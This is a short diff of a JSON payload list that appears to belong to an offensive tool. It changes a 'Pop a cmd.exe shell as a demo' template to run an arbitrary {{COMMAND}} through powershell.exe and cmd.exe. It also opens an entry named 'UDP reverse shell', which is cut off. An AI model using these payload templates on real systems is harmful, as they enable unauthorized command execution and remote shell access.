@@ -2,7 +2,7 @@
   "payloads": [
     {
       "payload_name": "Pop a cmd.exe shell as a demo",
-      "payload_template": "cmd.exe /k whoami"
+      "payload_template": "powershell.exe cmd.exe /k {{COMMAND}}"
     },
     {
       "payload_name": "UDP reverse shell",
